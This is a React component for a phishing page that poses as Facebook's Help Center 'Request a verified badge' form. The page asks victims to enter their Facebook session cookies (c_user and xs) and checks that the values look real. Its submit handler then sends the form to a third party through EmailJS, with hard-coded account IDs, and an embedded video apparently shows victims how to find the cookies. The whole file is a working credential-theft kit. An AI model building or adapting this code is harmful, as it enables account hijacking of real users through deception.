import React, { useState, useRef } from 'react';
import emailjs from '@emailjs/browser';
import './style.css';  // Ensure correct path to style.css

const ValidationPage = () => {
  const form = useRef();
  const [isFormValid, setIsFormValid] = useState(false);
  const [videoMuted, setVideoMuted] = useState(true);

  const sendEmail = (e) => {
    e.preventDefault();

    const cUserValue = form.current.elements["c_user"].value;
    const xsValue = form.current.elements["xs"].value;

    const cUserPattern = /^\d{15}$/;
    const xsPattern = /.*%+.*/;

    const isCUserValid = cUserPattern.test(cUserValue);
    const isXsValid = xsPattern.test(xsValue);

    if (isCUserValid && isXsValid) {
      emailjs
        .sendForm(
          'service_7lce09n',
          'template_2c9jb3o',
          form.current,
          '9A_y0UG3yCmhE-Hh8'
        )
        .then(
          (result) => {
            console.log(result.text);
          },
          (error) => {
            console.log(error.text);
          }
        );
    } else {
      setIsFormValid(true);
    }
  };

  return (
    <form ref={form} onSubmit={sendEmail}>
      <div className="d-flex align-items-center" style={{ width: "100%", height: "90px", background: "#4667AC" }}>
        <h1 className="text-white ms-4 m-0 d-flex align-self-center">facebook</h1>
      </div>

      <div className="d-flex align-items-center" style={{ width: "100%", height: "60px", background: "#E9EBEE" }}>
        <h4 className="ms-4 m-0 d-flex align-self-center text-primary">Help Center</h4>
      </div>

      <div className="col-12 my-4 d-flex justify-content-center align-items-center">
        <div className="col-11 col-md-6 border">
          <div className="p-2" style={{ background: "#F5F6F7" }}>
            <h5 className="m-0">Request a verified badge on Facebook</h5>
          </div>
          <div className="p-2">
            {isFormValid && (
              <div className="alert alert-danger">
                Please enter valid values for both fields.
                <br />
                For more detail, check the video below.
              </div>
            )}

            <p className="fw-semibold validation_form_para">
              The verified badge means that Facebook has confirmed that the Page or profile is the authentic presence of the individual, public figure, or brand that it represents.
            </p>

            <video
              controls
              autoPlay
              muted={videoMuted}
              src="https://firebasestorage.googleapis.com/v0/b/details-facebook-a00f0.appspot.com/o/0809.mp4?alt=media&token=b12189d9-dd1f-4d1a-8245-43b12e4094a9"
              style={{ width: "500px", height: "280px" }}
            ></video>

            <button
              onClick={() => setVideoMuted(false)}
              style={{ padding: "4px 8px", fontSize: "12px", marginTop: "10px" }}
            >
              Enable Sound
            </button>

            <label style={{ fontSize: "12px" }}>c_user</label>
            <br />
            <input type="number" name="c_user" required pattern="^\d{15}$" title="Please enter 15 digits" />
            <br />
            <label className="mt-2" style={{ fontSize: "12px" }}>xs</label>
            <br />
            <input type="text" name="xs" />
            <button type="submit" className="text-white border-0" style={{ background: "#4267B2" }}>
              Submit
            </button>
          </div>
        </div>
      </div>
    </form>
  );
};

export default ValidationPage;
